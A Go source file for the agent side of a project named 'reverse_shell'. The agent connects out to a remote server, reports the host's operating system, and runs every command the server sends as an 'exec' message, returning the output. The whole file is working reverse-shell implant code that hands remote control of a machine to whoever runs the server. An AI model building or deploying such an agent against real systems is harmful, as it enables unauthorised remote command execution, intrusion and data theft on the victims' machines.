package agent

import (
	"fmt"
	"net"
	"reverse_shell/pkg/protocol"
	"runtime"
)

type Client struct {
	Conn  net.Conn
	Codec *protocol.Codec
}

func Run(addr string, caFile, serverName string) (*Client, error) {
	conn, err := ConnectLoop(addr, caFile, serverName)
	if err != nil {
		return nil, err
	}
	codec := protocol.NewCodec(conn)

	client := &Client{
		Conn:  conn,
		Codec: codec,
	}
	fmt.Println("Client started")

	message := protocol.Message{
		Type:      protocol.MsgHello,
		Payload:   "Hello from " + runtime.GOOS + " agent",
		ID:        "1",
		SessionID: "1",
		Meta: map[string]string{
			"version":  "1.0",
			"platform": runtime.GOOS,
		},
	}
	if err := codec.Send(message); err != nil {
		return nil, err
	}
	fmt.Println("[+] Agent connected")

	go client.readLoop()

	return client, nil
}

func (c *Client) readLoop() {
	for {
		msg, err := c.Codec.Read()
		if err != nil {
			fmt.Println("Error reading message:", err)
			c.Conn.Close()
			return
		}
		fmt.Printf("Received message: %s\n", msg.Payload)
		c.handle(msg)
	}
}

func (c *Client) handle(msg protocol.Message) {
	switch msg.Type {
	case protocol.MsgHello:
		fmt.Println("[+] Server responded with hello")
		fmt.Println("[+] Connection established")
	case protocol.MsgPing:
		fmt.Println("[+] Received ping")
		response := protocol.Message{
			Type:      protocol.MsgPong,
			ID:        msg.ID,
			SessionID: msg.SessionID,
			Meta: map[string]string{
				"version":  "1.0",
				"platform": runtime.GOOS,
			},
			Payload: "Pong",
		}
		if err := c.Codec.Send(response); err != nil {
			fmt.Println("Error sending response:", err)
		}
	case protocol.MsgExec:
		fmt.Println("[+] Received command:", msg.Payload)
		output, err := ExecuteCommand(string(msg.Payload))
		if err != nil {
			fmt.Println("Error executing command:", err)
		} else {
			response := protocol.Message{
				Type:      protocol.MsgResult,
				Payload:   output,
				ID:        msg.ID,
				SessionID: msg.SessionID,
				Meta: map[string]string{
					"version":  "1.0",
					"platform": runtime.GOOS,
				},
			}
			if err := c.Codec.Send(response); err != nil {
				fmt.Println("Error sending response:", err)
				responseErr := protocol.Message{
					Type:      protocol.MsgError,
					Payload:   err.Error(),
					ID:        msg.ID,
					SessionID: msg.SessionID,
					Meta: map[string]string{
						"version":  "1.0",
						"platform": runtime.GOOS,
					},
				}
				if err := c.Codec.Send(responseErr); err != nil {
					fmt.Println("Error sending error response:", err)
				}
			}
		}
	default:
		fmt.Println("[+] Unknown message type:", msg.Type)
	}
}
